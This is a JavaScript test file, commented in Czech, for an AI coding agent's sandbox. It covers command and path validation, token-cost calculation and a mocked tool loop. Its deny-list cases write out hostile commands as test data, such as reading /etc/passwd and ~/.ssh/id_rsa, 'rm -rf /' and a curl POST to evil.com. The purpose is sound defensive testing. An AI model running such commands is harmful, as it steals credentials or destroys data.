// Integration test ImplementationAgentu s mockovaným Anthropic SDK.
// Reálné API se NIKDY nezavolá – test je deterministický a zdarma.
//
// Co kontrolujeme:
//   – Manual tool loop volá tools v pořadí, posílá tool_results, končí na 'done'
//   – validateBashCommand odmítá zakázané příkazy
//   – validateWritePath blokuje psaní mimo scope_paths a do .env / migrací
//   – computeCostUsd s pricing Sonnet 4.6
//   – Cost tracking se sčítá napříč iteracemi
//   – Budget exhausted zastaví loop
//   – Max iterations zastaví loop

import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import path from 'node:path';
import os from 'node:os';

import {
  runImplementationAgent,
  _internals,
} from '../implementationAgent.js';

const { validateBashCommand, validateWritePath, resolveSafePath, computeCostUsd } = _internals;

// ─── Pure validator tests ─────────────────────────────────────────────────

test('validateBashCommand: povolené příkazy projdou', () => {
  for (const cmd of [
    'npm test', 'npm run lint', 'npm run typecheck', 'npm ci',
    'npm install --ignore-scripts',
    'git status', 'git diff', 'git log --oneline',
    'ls -la', 'cat README.md', 'node script.js', 'pwd',
    'grep -r foo client/src/', 'find . -name "*.js"',
    'mkdir -p client/src/new',
  ]) {
    const r = validateBashCommand(cmd);
    assert.equal(r.ok, true, `"${cmd}" měl projít: ${r.error}`);
  }
});

test('C-1: cat absolutní cesta odmítnuta', () => {
  assert.equal(validateBashCommand('cat /etc/passwd').ok, false);
  assert.equal(validateBashCommand('cat ~/.ssh/id_rsa').ok, false);
  assert.equal(validateBashCommand('cat ../../../etc/passwd').ok, false);
  assert.equal(validateBashCommand('cat /Users/foo/secret').ok, false);
});

test('C-1: find/grep/ls absolutní cesta odmítnuta', () => {
  assert.equal(validateBashCommand('find / -name "*.env"').ok, false);
  assert.equal(validateBashCommand('grep -r foo /home/').ok, false);
  assert.equal(validateBashCommand('ls /etc/').ok, false);
  assert.equal(validateBashCommand('ls ~/.aws').ok, false);
});

test('C-1: head/tail/wc absolutní cesta odmítnuta', () => {
  assert.equal(validateBashCommand('head /etc/hosts').ok, false);
  assert.equal(validateBashCommand('tail -n 100 ~/.bash_history').ok, false);
  assert.equal(validateBashCommand('wc -l /var/log/syslog').ok, false);
});

test('H-3: npm run jen povolené skripty', () => {
  assert.equal(validateBashCommand('npm run lint').ok, true);
  assert.equal(validateBashCommand('npm run test').ok, true);
  assert.equal(validateBashCommand('npm run deploy').ok, false);
  assert.equal(validateBashCommand('npm run prepush').ok, false);
  assert.equal(validateBashCommand('npm run postinstall').ok, false);
});

test('H-3: npm install vyžaduje --ignore-scripts', () => {
  assert.equal(validateBashCommand('npm install').ok, false);
  assert.equal(validateBashCommand('npm install pg').ok, false);
  assert.equal(validateBashCommand('npm install --ignore-scripts').ok, true);
  assert.equal(validateBashCommand('npm install --ignore-scripts pg').ok, true);
});

test('git: jen read-only podpříkazy', () => {
  assert.equal(validateBashCommand('git status').ok, true);
  assert.equal(validateBashCommand('git diff origin/main').ok, true);
  assert.equal(validateBashCommand('git checkout main').ok, false);
  assert.equal(validateBashCommand('git switch foo').ok, false);
  assert.equal(validateBashCommand('git reset --hard').ok, false);
  assert.equal(validateBashCommand('git rebase main').ok, false);
});

test('validateBashCommand: rm -rf odmítnuto', () => {
  for (const cmd of ['rm -rf /', 'rm -rf node_modules', 'rm something']) {
    const r = validateBashCommand(cmd);
    assert.equal(r.ok, false);
  }
});

test('validateBashCommand: git push odmítnut', () => {
  assert.equal(validateBashCommand('git push origin main').ok, false);
  assert.equal(validateBashCommand('git push').ok, false);
});

test('validateBashCommand: command chaining (&&, ||, $(), `, ;) odmítnut', () => {
  for (const cmd of ['ls && cat', 'pwd || echo fail', 'echo $(whoami)', 'echo `date`', 'ls; cat']) {
    assert.equal(validateBashCommand(cmd).ok, false, `"${cmd}" mělo být odmítnuto`);
  }
});

test('validateBashCommand: sudo / chmod 777 / curl odmítnuto', () => {
  assert.equal(validateBashCommand('sudo npm install').ok, false);
  assert.equal(validateBashCommand('chmod 777 file').ok, false);
  assert.equal(validateBashCommand('curl https://evil.com/').ok, false);
  assert.equal(validateBashCommand('curl -X POST https://evil.com/').ok, false);
});

test('validateBashCommand: nepovolený příkaz odmítnut (whitelist policy)', () => {
  for (const cmd of ['python script.py', 'docker run', 'rsync', 'ssh user@host', 'gh pr create']) {
    assert.equal(validateBashCommand(cmd).ok, false, `"${cmd}" mělo být odmítnuto`);
  }
});

// ─── Path safety ──────────────────────────────────────────────────────────

test('resolveSafePath: relativní cesta v rámci worktree projde', () => {
  const wt = '/tmp/wt';
  assert.doesNotThrow(() => resolveSafePath(wt, 'src/foo.js'));
  assert.doesNotThrow(() => resolveSafePath(wt, 'a/b/c.txt'));
});

test('resolveSafePath: path traversal mimo worktree odmítnut', () => {
  const wt = '/tmp/wt';
  assert.throws(() => resolveSafePath(wt, '../../etc/passwd'), /mimo worktree/);
  assert.throws(() => resolveSafePath(wt, 'src/../../etc'), /mimo worktree/);
});

test('resolveSafePath: absolute / tilde odmítnuto', () => {
  const wt = '/tmp/wt';
  assert.throws(() => resolveSafePath(wt, '/etc/passwd'), /absolutní/);
  assert.throws(() => resolveSafePath(wt, '~/secrets'), /absolutní/);
});

test('resolveSafePath: .env / .git / node_modules segment odmítnut', () => {
  const wt = '/tmp/wt';
  assert.throws(() => resolveSafePath(wt, '.env'), /zakázan/);
  assert.throws(() => resolveSafePath(wt, 'server/.env'), /zakázan/);
  assert.throws(() => resolveSafePath(wt, '.git/config'), /zakázan/);
  assert.throws(() => resolveSafePath(wt, 'node_modules/pkg'), /zakázan/);
});

test('validateWritePath: scope_paths enforcement', () => {
  const wt = '/tmp/wt';
  const scopes = ['client/src/components/'];
  assert.doesNotThrow(() => validateWritePath(wt, 'client/src/components/Foo.jsx', scopes));
  assert.throws(() => validateWritePath(wt, 'server/src/routes/foo.js', scopes), /mimo scope_paths/);
});

test('validateWritePath: prázdné scope_paths = povoleno všude', () => {
  const wt = '/tmp/wt';
  assert.doesNotThrow(() => validateWritePath(wt, 'anything/file.js', []));
  assert.doesNotThrow(() => validateWritePath(wt, 'anything/file.js', undefined));
});

test('validateWritePath: existující migrace nelze přepsat', () => {
  const wt = '/tmp/wt';
  assert.throws(
    () => validateWritePath(wt, 'server/src/migrations/2026-05-19-ai-agent.sql', []),
    /immutable/
  );
});

test('validateWritePath: CLAUDE.md nelze přepsat', () => {
  const wt = '/tmp/wt';
  assert.throws(() => validateWritePath(wt, 'CLAUDE.md', []), /nelze přepisovat/);
});

// ─── Cost computation ────────────────────────────────────────────────────

test('computeCostUsd: pure input/output Sonnet 4.6', () => {
  // 1M input + 1M output při 3/15 USD/M → 18 USD
  const c = computeCostUsd({ input_tokens: 1_000_000, output_tokens: 1_000_000 });
  assert.equal(c, 18);
});

test('computeCostUsd: cache read je 0.1× input price', () => {
  // 1M cache_read = 0.3 USD (3 * 0.1)
  const c = computeCostUsd({ input_tokens: 0, output_tokens: 0, cache_read_input_tokens: 1_000_000 });
  assert.equal(Number(c.toFixed(4)), 0.3);
});

test('computeCostUsd: cache write je 1.25× input price', () => {
  // 1M cache_write = 3.75 USD (3 * 1.25)
  const c = computeCostUsd({ input_tokens: 0, output_tokens: 0, cache_creation_input_tokens: 1_000_000 });
  assert.equal(Number(c.toFixed(4)), 3.75);
});

test('computeCostUsd: chybějící usage = 0', () => {
  assert.equal(computeCostUsd(null), 0);
  assert.equal(computeCostUsd(undefined), 0);
  assert.equal(computeCostUsd({}), 0);
});

// ─── Manual tool loop s mockovaným klientem ─────────────────────────────

/**
 * Vytvoří mock Anthropic klient, který v každém volání vrátí naskriptovanou response.
 * @param {Array<object>} scriptedResponses
 */
function makeMockClient(scriptedResponses) {
  let i = 0;
  const calls = [];
  return {
    client: {
      messages: {
        create: async (params) => {
          // Snapshot params, ať pozdější mutace messages pole (které agent v loopu
          // dělá) neovlivnily staré záznamy. Reálné SDK serializuje na HTTP.
          calls.push({ params: JSON.parse(JSON.stringify(params)), callIndex: i });
          if (i >= scriptedResponses.length) {
            throw new Error(`mock client: víc volání (${i + 1}) než naskriptovaných odpovědí (${scriptedResponses.length})`);
          }
          const r = scriptedResponses[i++];
          return r;
        },
      },
    },
    getCalls: () => calls,
  };
}

// Helper na vytvoření Anthropic-style response
function mockResponse({ content, stop_reason = 'tool_use', usage = {} }) {
  return {
    id: `msg_mock_${Math.random()}`,
    type: 'message',
    role: 'assistant',
    model: 'claude-sonnet-4-6',
    content,
    stop_reason,
    usage: {
      input_tokens: usage.input_tokens ?? 1000,
      output_tokens: usage.output_tokens ?? 500,
      cache_creation_input_tokens: usage.cache_creation_input_tokens ?? 0,
      cache_read_input_tokens: usage.cache_read_input_tokens ?? 0,
    },
  };
}

test('integration: agent zavolá write_file → bash → done, posbírá výstup', async () => {
  const tmpWt = await fs.mkdtemp(path.join(os.tmpdir(), 'agent-test-'));

  try {
    const scripted = [
      // Iter 1: write_file
      mockResponse({
        content: [
          { type: 'text', text: 'Začínám psaním PLAN.md.' },
          { type: 'tool_use', id: 'tu_1', name: 'write_file', input: { path: 'PLAN.md', content: '## Cíl\nimplementuj X' } },
        ],
        usage: { input_tokens: 800, output_tokens: 200, cache_creation_input_tokens: 5000 },
      }),
      // Iter 2: bash
      mockResponse({
        content: [
          { type: 'tool_use', id: 'tu_2', name: 'bash', input: { command: 'ls' } },
        ],
        usage: { input_tokens: 100, output_tokens: 50, cache_read_input_tokens: 5800 },
      }),
      // Iter 3: done
      mockResponse({
        content: [
          { type: 'tool_use', id: 'tu_3', name: 'done', input: {
            summary: '## Co jsem udělal\nVytvořil PLAN.md.\n\n## AC check\n- AC #1 – ✅',
            success: true,
          }},
        ],
        stop_reason: 'tool_use',
        usage: { input_tokens: 100, output_tokens: 300, cache_read_input_tokens: 5800 },
      }),
    ];

    const mock = makeMockClient(scripted);
    const task = {
      id: 42,
      title: 'Test task',
      description: 'Pro účely testu udělej něco jednoduchého. (Tento popis musí mít alespoň 30 znaků – tady ho máme.)',
      acceptance_criteria: ['Musí být PLAN.md'],
      out_of_scope: [],
      scope_paths: [],
      max_iterations: 5,
    };

    const result = await runImplementationAgent({
      task,
      bundle: { task, parent: null, project: null, comments: [], claudeMd: { content: null, source: 'missing' }, assembledAt: '' },
      worktreePath: tmpWt,
      branch: 'claude/task-42',
      apiKey: 'mock-key',
      maxIterations: 5,
      client: mock.client,
    });

    assert.equal(result.success, true);
    assert.equal(result.iterations, 3);
    assert.match(result.summary, /Co jsem udělal/);
    assert.ok(result.costUsd > 0);
    // Cost = volání 1 + 2 + 3 dohromady. Měl by být v rozumném rozsahu.
    assert.ok(result.costUsd < 1, `cost ${result.costUsd} USD je moc – zkontroluj výpočet`);
    assert.equal(result.error, null);

    // PLAN.md skutečně vznikl
    const planContent = await fs.readFile(path.join(tmpWt, 'PLAN.md'), 'utf8');
    assert.match(planContent, /implementuj X/);

    // Klient byl volaný 3×
    assert.equal(mock.getCalls().length, 3);
    // První volání by mělo mít cache_control na system bloku
    const firstCall = mock.getCalls()[0].params;
    assert.equal(firstCall.system[0].cache_control.type, 'ephemeral');
    // Druhé volání by mělo posílat tool_result jako poslední user message
    const secondCall = mock.getCalls()[1].params;
    const lastMsg = secondCall.messages[secondCall.messages.length - 1];
    assert.equal(lastMsg.role, 'user');
    assert.equal(lastMsg.content[0].type, 'tool_result');
  } finally {
    await fs.rm(tmpWt, { recursive: true, force: true });
  }
});

test('integration: agent se pokusí psát mimo scope_paths → dostane error v tool_result', async () => {
  const tmpWt = await fs.mkdtemp(path.join(os.tmpdir(), 'agent-test-'));
  try {
    const scripted = [
      // Iter 1: pokus o write mimo scope
      mockResponse({
        content: [
          { type: 'tool_use', id: 'tu_1', name: 'write_file', input: { path: 'server/src/routes/leak.js', content: 'secret' } },
        ],
      }),
      // Iter 2: model vidí chybu, vzdá to přes done(success=false)
      mockResponse({
        content: [
          { type: 'tool_use', id: 'tu_2', name: 'done', input: {
            summary: '## Otevřené otázky\nNelze psát mimo scope.',
            success: false,
          }},
        ],
      }),
    ];
    const mock = makeMockClient(scripted);
    const task = {
      id: 99,
      title: 'Scope test',
      description: 'Tohle je dostatečně dlouhý popis úkolu pro AI agenta na ostrý běh aspoň 30 znaků.',
      acceptance_criteria: ['Stejně to selže'],
      out_of_scope: [],
      scope_paths: ['client/src/'],
      max_iterations: 5,
    };

    const result = await runImplementationAgent({
      task,
      bundle: { task, parent: null, project: null, comments: [], claudeMd: { content: null, source: 'missing' }, assembledAt: '' },
      worktreePath: tmpWt,
      branch: 'claude/task-99',
      apiKey: 'mock-key',
      maxIterations: 5,
      client: mock.client,
    });

    assert.equal(result.success, false);
    assert.equal(result.iterations, 2);

    // Druhé volání by mělo obsahovat tool_result s is_error: true
    const secondCall = mock.getCalls()[1].params;
    const toolResultMsg = secondCall.messages[secondCall.messages.length - 1];
    assert.equal(toolResultMsg.content[0].is_error, true);
    assert.match(toolResultMsg.content[0].content, /mimo scope_paths/);

    // Soubor mimo scope se NEMĚL vytvořit
    await assert.rejects(
      () => fs.access(path.join(tmpWt, 'server/src/routes/leak.js')),
      { code: 'ENOENT' }
    );
  } finally {
    await fs.rm(tmpWt, { recursive: true, force: true });
  }
});

test('integration: agent skončí na max_iterations bez done', async () => {
  const tmpWt = await fs.mkdtemp(path.join(os.tmpdir(), 'agent-test-'));
  try {
    // Vrátíme stále stejnou tool_use response – loop musí skončit po max_iterations
    const looping = mockResponse({
      content: [{ type: 'tool_use', id: 'tu_loop', name: 'bash', input: { command: 'ls' } }],
    });
    const mock = makeMockClient([looping, looping, looping]);

    const task = {
      id: 7, title: 't', description: 'Dlouhý popis pro AI agenta – aspoň 30 znaků prosím a teď.',
      acceptance_criteria: ['x'], out_of_scope: [], scope_paths: [],
    };

    const result = await runImplementationAgent({
      task,
      bundle: { task, parent: null, project: null, comments: [], claudeMd: { content: null, source: 'missing' }, assembledAt: '' },
      worktreePath: tmpWt,
      branch: 'claude/task-7',
      apiKey: 'mock-key',
      maxIterations: 3,
      client: mock.client,
    });

    assert.equal(result.success, false);
    assert.equal(result.error, 'max_iterations_reached');
    assert.equal(result.iterations, 3);
  } finally {
    await fs.rm(tmpWt, { recursive: true, force: true });
  }
});

test('integration: budget exhausted zastaví loop před API voláním', async () => {
  const tmpWt = await fs.mkdtemp(path.join(os.tmpdir(), 'agent-test-'));
  try {
    // První volání utratí $5 (přemrštěné mock usage)
    const expensive = mockResponse({
      content: [{ type: 'tool_use', id: 'tu_e', name: 'bash', input: { command: 'ls' } }],
      usage: { input_tokens: 2_000_000, output_tokens: 0 }, // 2M * $3/M = $6
    });
    const mock = makeMockClient([expensive, expensive]);

    const task = {
      id: 8, title: 't', description: 'Tohle je popis úkolu pro test – musí mít aspoň 30 znaků a má je.',
      acceptance_criteria: ['x'], out_of_scope: [], scope_paths: [],
    };

    const result = await runImplementationAgent({
      task,
      bundle: { task, parent: null, project: null, comments: [], claudeMd: { content: null, source: 'missing' }, assembledAt: '' },
      worktreePath: tmpWt,
      branch: 'claude/task-8',
      apiKey: 'mock-key',
      maxIterations: 10,
      maxCostUsd: 2.0, // limit $2, první call utratí $6 → druhý se neprovede
      client: mock.client,
    });

    assert.equal(result.error, 'budget_exhausted');
    assert.equal(result.success, false);
    // První call proběhl (dosáhli jsme $6), druhý ne (budget gate před API voláním)
    assert.equal(mock.getCalls().length, 1);
  } finally {
    await fs.rm(tmpWt, { recursive: true, force: true });
  }
});

test('integration: invalid scope_paths → agent se ani nezavolá', async () => {
  const tmpWt = await fs.mkdtemp(path.join(os.tmpdir(), 'agent-test-'));
  try {
    const mock = makeMockClient([]);
    const task = {
      id: 9, title: 't', description: 'description',
      acceptance_criteria: ['x'], out_of_scope: [],
      scope_paths: ['../../etc/passwd'], // path traversal!
    };

    const result = await runImplementationAgent({
      task,
      bundle: { task, parent: null, project: null, comments: [], claudeMd: { content: null, source: 'missing' }, assembledAt: '' },
      worktreePath: tmpWt,
      branch: 'claude/task-9',
      apiKey: 'mock-key',
      client: mock.client,
    });

    assert.equal(result.success, false);
    assert.match(result.error, /invalid_scope_paths/);
    assert.equal(result.iterations, 0);
    assert.equal(result.costUsd, 0);
    assert.equal(mock.getCalls().length, 0);
  } finally {
    await fs.rm(tmpWt, { recursive: true, force: true });
  }
});
